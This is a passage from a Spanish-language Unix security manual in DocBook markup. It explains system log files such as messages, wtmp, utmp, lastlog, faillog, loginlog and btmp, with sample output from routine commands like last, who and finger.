&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;03:31:37&#x00A0;anita&#x00A0;rpcbind:&#x00A0;connect&#x00A0;from&#x00A0;127.0.0.1&#x00A0;to&#x00A0;getport(R&#x00A0;)
&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;11:07:04&#x00A0;anita&#x00A0;in.telnetd[14847]:&#x00A0;connect&#x00A0;from&#x00A0;rosita
&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;11:40:43&#x00A0;anita&#x00A0;in.telnetd[14964]:&#x00A0;connect&#x00A0;from&#x00A0;localhost
&#x00A0;anita:/#
</literallayout>
<!--l. 377--><para>
  </para></section><!--end subsection--><!--l. 377--><section 
role="subsection"><title><abbrev role="title-mark">6.4.2</abbrev><anchor 
   id="x1-890006.4.2"  ></anchor>messages</title>
<!--l. 378--><para>  En este archivo de texto se almacenan datos &#x2018;informativos&#x2019; de ciertos programas, mensajes de baja o
media prioridad destinados m&#x00E1;s a informar que a avisar de sucesos importantes, como informaci&#x00F3;n relativa al
arranque de la m&#x00E1;quina; no obstante, como suced&#x02CA;&#x0131;a con el &#xFB01;chero syslog, en funci&#x00F3;n de /etc/syslog.conf
podremos guardar todo tipo de datos. Para visualizar su contenido es su&#xFB01;ciente una orden como cat o
similares:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;head&#x00A0;-70&#x00A0;/var/adm/messages
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;SunOS&#x00A0;Release&#x00A0;5.7&#x00A0;Version&#x00A0;Generic
&#x00A0;[UNIX(R)&#x00A0;System&#x00A0;V&#x00A0;Release&#x00A0;4.0]
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;Copyright&#x00A0;(c)&#x00A0;1983-1998,&#x00A0;Sun&#x00A0;Microsystems,&#x00A0;Inc.
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;mem&#x00A0;=&#x00A0;65152K&#x00A0;(0x3fa0000)
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;avail&#x00A0;mem&#x00A0;=&#x00A0;51167232
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;root&#x00A0;nexus&#x00A0;=&#x00A0;i86pc
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;isa0&#x00A0;at&#x00A0;root
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;pci0&#x00A0;at&#x00A0;root:&#x00A0;space&#x00A0;0&#x00A0;offset&#x00A0;0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;IDE&#x00A0;device&#x00A0;at&#x00A0;targ&#x00A0;0,&#x00A0;lun&#x00A0;0&#x00A0;lastlun&#x00A0;0x0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;model&#x00A0;WDC&#x00A0;WD84AA,&#x00A0;stat&#x00A0;50,&#x00A0;err&#x00A0;0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cfg&#x00A0;0x427a,&#x00A0;cyl&#x00A0;16383,&#x00A0;hd&#x00A0;16,&#x00A0;sec/trk&#x00A0;63
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mult1&#x00A0;0x8010,&#x00A0;mult2&#x00A0;0x110,&#x00A0;dwcap&#x00A0;0x0,
&#x00A0;cap&#x00A0;0x2f00
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;piomode&#x00A0;0x280,&#x00A0;dmamode&#x00A0;0x0,&#x00A0;advpiomode
&#x00A0;0x3
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;minpio&#x00A0;120,&#x00A0;minpioflow&#x00A0;120
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;valid&#x00A0;0x7,&#x00A0;dwdma&#x00A0;0x7,&#x00A0;majver&#x00A0;0x1e
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;ata&#x005F;set&#x005F;feature:&#x00A0;(0x66,0x0)&#x00A0;failed
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ATAPI&#x00A0;device&#x00A0;at&#x00A0;targ&#x00A0;1,&#x00A0;lun&#x00A0;0&#x00A0;lastlun&#x00A0;0x0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;model&#x00A0;CD-ROM&#x00A0;50X,&#x00A0;stat&#x00A0;50,&#x00A0;err&#x00A0;0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cfg&#x00A0;0x85a0,&#x00A0;cyl&#x00A0;0,&#x00A0;hd&#x00A0;0,&#x00A0;sec/trk&#x00A0;0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mult1&#x00A0;0x0,&#x00A0;mult2&#x00A0;0x0,&#x00A0;dwcap&#x00A0;0x0,&#x00A0;cap&#x00A0;0xf00
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;piomode&#x00A0;0x400,&#x00A0;dmamode&#x00A0;0x200,&#x00A0;advpiomode
&#x00A0;0x3
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;minpio&#x00A0;227,&#x00A0;minpioflow&#x00A0;120
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;valid&#x00A0;0x6,&#x00A0;dwdma&#x00A0;0x107,&#x00A0;majver&#x00A0;0x0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;PCI-device:&#x00A0;ata@0,&#x00A0;ata0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;ata0&#x00A0;is&#x00A0;/pci@0,0/pci-ide@7,1/ata@0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;Disk0:&#x00A0;&#x00A0;&#x003C;Vendor&#x00A0;&#x2019;Gen-ATA&#x00A0;&#x2019;&#x00A0;Product&#x00A0;&#x2019;WDC&#x00A0;WD84AA&#x00A0;&#x2019;&#x003E;
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;cmdk0&#x00A0;at&#x00A0;ata0&#x00A0;target&#x00A0;0&#x00A0;lun&#x00A0;0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;cmdk0&#x00A0;is&#x00A0;/pci@0,0/pci-ide@7,1/ata@0/cmdk@0,0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;root&#x00A0;on&#x00A0;/pci@0,0/pci-ide@7,1/ide@0/cmdk@0,0:a
&#x00A0;fstype&#x00A0;ufs
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;asy0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;asy0&#x00A0;is&#x00A0;/isa/asy@1,3f8
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;asy1
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;asy1&#x00A0;is&#x00A0;/isa/asy@1,2f8
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;asy2
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;asy2&#x00A0;is&#x00A0;/isa/pnpSUP,1670@pnpSUP,1670,7ec2
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;Number&#x00A0;of&#x00A0;console&#x00A0;virtual&#x00A0;screens&#x00A0;=&#x00A0;13
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;cpu&#x00A0;0&#x00A0;initialization&#x00A0;complete&#x00A0;-&#x00A0;online
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:54&#x00A0;anita&#x00A0;unix:&#x00A0;dump&#x00A0;on&#x00A0;/dev/dsk/c0d0s1&#x00A0;size&#x00A0;86&#x00A0;MB
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:55&#x00A0;anita&#x00A0;unix:&#x00A0;pseudo-device:&#x00A0;pm0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:55&#x00A0;anita&#x00A0;unix:&#x00A0;pm0&#x00A0;is&#x00A0;/pseudo/pm@0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:56&#x00A0;anita&#x00A0;unix:&#x00A0;pseudo-device:&#x00A0;vol0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:56&#x00A0;anita&#x00A0;unix:&#x00A0;vol0&#x00A0;is&#x00A0;/pseudo/vol@0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:57&#x00A0;anita&#x00A0;icmpinfo:&#x00A0;started,&#x00A0;PID=213.
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:57&#x00A0;anita&#x00A0;unix:&#x00A0;sd1&#x00A0;at&#x00A0;ata0:
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:57&#x00A0;anita&#x00A0;unix:&#x00A0;&#x00A0;target&#x00A0;1&#x00A0;lun&#x00A0;0
&#x00A0;Jan&#x00A0;24&#x00A0;18:09:57&#x00A0;anita&#x00A0;unix:&#x00A0;sd1&#x00A0;is&#x00A0;/pci@0,0/pci-ide@7,1/ata@0/sd@1,0
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:03&#x00A0;anita&#x00A0;icmpinfo:&#x00A0;ICMP&#x005F;Dest&#x005F;Unreachable[Port]&#x00A0;&#x003C;&#x00A0;127.0.0.1
&#x00A0;[localhost]&#x00A0;&#x003E;&#x00A0;127.0.0.1&#x00A0;[localhost]&#x00A0;sp=1664&#x00A0;dp=3200&#x00A0;seq=0x002e0000&#x00A0;sz=74(+20)

&#x00A0;Jan&#x00A0;24&#x00A0;18:10:03&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;fdc0
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:03&#x00A0;anita&#x00A0;unix:&#x00A0;fd0&#x00A0;at&#x00A0;fdc0
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:03&#x00A0;anita&#x00A0;unix:&#x00A0;fd0&#x00A0;is&#x00A0;/isa/fdc@1,3f0/fd@0,0
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:04&#x00A0;anita&#x00A0;icmpinfo:&#x00A0;ICMP&#x005F;Dest&#x005F;Unreachable[Port]&#x00A0;&#x003C;&#x00A0;127.0.0.1
&#x00A0;[localhost]&#x00A0;&#x003E;&#x00A0;127.0.0.1&#x00A0;[localhost]&#x00A0;sp=2944&#x00A0;dp=161&#x00A0;seq=0x00420000&#x00A0;sz=92(+20)
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:05&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;asy0
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:05&#x00A0;anita&#x00A0;unix:&#x00A0;asy0&#x00A0;is&#x00A0;/isa/asy@1,3f8
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:05&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;asy1
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:05&#x00A0;anita&#x00A0;unix:&#x00A0;asy1&#x00A0;is&#x00A0;/isa/asy@1,2f8
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:05&#x00A0;anita&#x00A0;unix:&#x00A0;ISA-device:&#x00A0;asy2
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:05&#x00A0;anita&#x00A0;unix:&#x00A0;asy2&#x00A0;is&#x00A0;/isa/pnpSUP,1670@pnpSUP,1670,7ec2
&#x00A0;an&#x00A0;24&#x00A0;18:10:08&#x00A0;anita&#x00A0;icmpinfo:&#x00A0;ICMP&#x005F;Dest&#x005F;Unreachable[Port]&#x00A0;&#x003C;&#x00A0;127.0.0.1
&#x00A0;[localhost]&#x00A0;&#x003E;&#x00A0;127.0.0.1&#x00A0;[localhost]&#x00A0;sp=32780&#x00A0;dp=162&#x00A0;seq=0x00370000&#x00A0;sz=83(+20)
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:35&#x00A0;anita&#x00A0;unix:&#x00A0;pseudo-device:&#x00A0;xsvc0
&#x00A0;Jan&#x00A0;24&#x00A0;18:10:35&#x00A0;anita&#x00A0;unix:&#x00A0;xsvc0&#x00A0;is&#x00A0;/pseudo/xsvc@0
&#x00A0;anita:/#
</literallayout>
<!--l. 457--><para>
  </para></section><!--end subsection--><!--l. 457--><section 
role="subsection"><title><abbrev role="title-mark">6.4.3</abbrev><anchor 
   id="x1-900006.4.3"  ></anchor>wtmp</title>
<!--l. 458--><para>  Este archivo es un &#xFB01;chero binario (no se puede leer su contenido directamente volc&#x00E1;ndolo con cat o
similares) que almacena informaci&#x00F3;n relativa a cada conexi&#x00F3;n y desconexi&#x00F3;n al sistema. Podemos ver su
contenido con &#x00F3;rdenes como last:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;last&#x00A0;-10
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/11&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mon&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;11:07&#x00A0;-&#x00A0;11:07&#x00A0;&#x00A0;(00:00)
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/11&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rosita&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Sun&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;04:22&#x00A0;-&#x00A0;04:25&#x00A0;&#x00A0;(00:03)
&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;andercheran.aiin&#x00A0;Sun&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;02:30&#x00A0;&#x00A0;&#x00A0;still&#x00A0;logged&#x00A0;in
&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;andercheran.aiin&#x00A0;Sun&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;00:28&#x00A0;-&#x00A0;02:30&#x00A0;&#x00A0;(02:01)
&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Thu&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;03:02&#x00A0;-&#x00A0;00:28&#x00A0;(2+21:25)
&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Thu&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;03:01&#x00A0;-&#x00A0;03:02&#x00A0;&#x00A0;(00:00)
&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Thu&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;02:35&#x00A0;-&#x00A0;03:01&#x00A0;&#x00A0;(00:26)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;console&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Thu&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;00:13&#x00A0;&#x00A0;&#x00A0;still&#x00A0;logged&#x00A0;in
&#x00A0;reboot&#x00A0;&#x00A0;&#x00A0;&#x00A0;system&#x00A0;boot&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Thu&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;00:12
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;console&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Wed&#x00A0;Mar&#x00A0;&#x00A0;1&#x00A0;06:18&#x00A0;-&#x00A0;down&#x00A0;&#x00A0;&#x00A0;(17:54)
&#x00A0;anita:/#
</literallayout>
<!--l. 478--><para>Los registros guardados en este archivo (y tambi&#x00E9;n en el &#xFB01;chero utmp) tienen el formato de la estructura
utmp, que contiene informaci&#x00F3;n como el nombre de usuario, la l&#x02CA;&#x0131;nea por la que accede, el lugar desde donde
lo hace y la hora de acceso; se puede consultar la p&#x00E1;gina de manual de funciones como getutent() para ver
la estructura concreta en el clon de Unix en el que trabajemos. Algunas variantes de Unix (como Solaris o
IRIX) utilizan un &#xFB01;chero wtmp extendido denominado wtmpx, con campos adicionales que proporcionan m&#x00E1;s
informaci&#x00F3;n sobre cada conexi&#x00F3;n.
  </para></section><!--end subsection--><!--l. 487--><section 
role="subsection"><title><abbrev role="title-mark">6.4.4</abbrev><anchor 
   id="x1-910006.4.4"  ></anchor>utmp</title>
<!--l. 488--><para>  El archivo utmp es un &#xFB01;chero binario con informaci&#x00F3;n de cada usuario que est&#x00E1; conectado en
un momento dado; el programa /bin/login genera un registro en este &#xFB01;chero cuando un
usuario conecta, mientras que init lo elimina cuando desconecta. Aunque habitualmente este
archivo est&#x00E1; situado en /var/adm/, junto a otros &#xFB01;cheros de log, es posible encontrar algunos
Unices &#x2013; los m&#x00E1;s antiguos &#x2013; que lo situan en /etc/. Para visualizar el contenido de este archivo
podemos utilizar &#x00F3;rdenes como last (indicando el nombre de &#xFB01;chero mediante la opci&#x00F3;n -f), w o
who:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;who
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;console&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;00:13
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;3&#x00A0;00:47&#x00A0;&#x00A0;(unix)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/3&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;00:18&#x00A0;&#x00A0;(unix)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/5&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;00:56&#x00A0;&#x00A0;(unix)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/6&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;02:23&#x00A0;&#x00A0;(unix:0.0)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/8&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;3&#x00A0;00:02&#x00A0;&#x00A0;(unix:0.0)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/7&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;2&#x00A0;23:43&#x00A0;&#x00A0;(unix:0.0)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/9&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;3&#x00A0;00:51&#x00A0;&#x00A0;(unix)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pts/10&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;00:23&#x00A0;&#x00A0;(unix)
&#x00A0;anita:/#
</literallayout>
<!--l. 512--><para>Como suced&#x02CA;&#x0131;a con wtmp, algunos Unices utilizan tambi&#x00E9;n una versi&#x00F3;n extendida de utmp (utmpx) con campos
adicionales.
  </para></section><!--end subsection--><!--l. 514--><section 
role="subsection"><title><abbrev role="title-mark">6.4.5</abbrev><anchor 
   id="x1-920006.4.5"  ></anchor>lastlog</title>
<!--l. 515--><para>  El archivo lastlog es un &#xFB01;chero binario guardado generalmente en /var/adm/, y que contiene un
registro para cada usuario con la fecha y hora de su &#x00FA;ltima conexi&#x00F3;n; podemos visualizar estos datos para un
usuario dado mediante &#x00F3;rdenes como who o finger:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;finger&#x00A0;toni
&#x00A0;Login&#x00A0;name:&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;In&#x00A0;real&#x00A0;life:&#x00A0;Toni&#x00A0;at&#x00A0;ANITA
&#x00A0;Directory:&#x00A0;/export/home/toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Shell:&#x00A0;/bin/sh
&#x00A0;Last&#x00A0;login&#x00A0;Mon&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;11:07&#x00A0;on&#x00A0;pts/11&#x00A0;from&#x00A0;localhost
&#x00A0;No&#x00A0;unread&#x00A0;mail
&#x00A0;No&#x00A0;Plan.
&#x00A0;anita:/#
</literallayout>
<!--l. 530--><para>
  </para></section><!--end subsection--><!--l. 530--><section 
role="subsection"><title><abbrev role="title-mark">6.4.6</abbrev><anchor 
   id="x1-930006.4.6"  ></anchor>faillog</title>
<!--l. 531--><para>  Este &#xFB01;chero es equivalente al anterior, pero en lugar de guardar informaci&#x00F3;n sobre la fecha y hora del
&#x00FA;ltimo acceso al sistema lo hace del &#x00FA;ltimo intento de acceso de cada usuario; una conexi&#x00F3;n es fallida si el
usuario (o alguien en su lugar) teclea incorrectamente su contrase~na. Esta informaci&#x00F3;n se muestra la
siguiente vez que dicho usuario entra correctamente a la m&#x00E1;quina:

     </para><literallayout role="verbatim">
&#x00A0;andercheran&#x00A0;login:&#x00A0;toni
&#x00A0;Password:
&#x00A0;Linux&#x00A0;2.0.33.
&#x00A0;1&#x00A0;failure&#x00A0;since&#x00A0;last&#x00A0;login.&#x00A0;&#x00A0;Last&#x00A0;was&#x00A0;14:39:41&#x00A0;on&#x00A0;ttyp9.
&#x00A0;Last&#x00A0;login:&#x00A0;Wed&#x00A0;May&#x00A0;13&#x00A0;14:37:46&#x00A0;on&#x00A0;ttyp9&#x00A0;from&#x00A0;pleione.cc.upv.es.
&#x00A0;
&#x00A0;andercheran:~$
</literallayout>
<!--l. 548--><para>
  </para></section><!--end subsection--><!--l. 548--><section 
role="subsection"><title><abbrev role="title-mark">6.4.7</abbrev><anchor 
   id="x1-940006.4.7"  ></anchor>loginlog</title>
<!--l. 549--><para>  Si en algunas versiones de Unix (como Solaris) creamos el archivo /var/adm/loginlog (que
originalmente no existe), se registrar&#x00E1;n en &#x00E9;l los intentos fallidos de login, siempre y cuando se produzcan
cinco o m&#x00E1;s de ellos seguidos:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cat&#x00A0;/var/adm/loginlog
&#x00A0;toni:/dev/pts/6:Thu&#x00A0;Jan&#x00A0;&#x00A0;6&#x00A0;07:02:53&#x00A0;2000
&#x00A0;toni:/dev/pts/6:Thu&#x00A0;Jan&#x00A0;&#x00A0;6&#x00A0;07:03:00&#x00A0;2000
&#x00A0;toni:/dev/pts/6:Thu&#x00A0;Jan&#x00A0;&#x00A0;6&#x00A0;07:03:08&#x00A0;2000
&#x00A0;toni:/dev/pts/6:Thu&#x00A0;Jan&#x00A0;&#x00A0;6&#x00A0;07:03:37&#x00A0;2000
&#x00A0;toni:/dev/pts/6:Thu&#x00A0;Jan&#x00A0;&#x00A0;6&#x00A0;07:03:44&#x00A0;2000
&#x00A0;anita:/#
</literallayout>
<!--l. 564--><para>
  </para></section><!--end subsection--><!--l. 564--><section 
role="subsection"><title><abbrev role="title-mark">6.4.8</abbrev><anchor 
   id="x1-950006.4.8"  ></anchor>btmp</title>
<!--l. 565--><para>  En algunos clones de Unix, como Linux o HP-UX, el &#xFB01;chero btmp se utiliza para registrar las conexiones
fallidas al sistema, con un formato similar al que wtmp utiliza para las conexiones que han tenido
&#x00E9;xito:

     </para><literallayout role="verbatim">
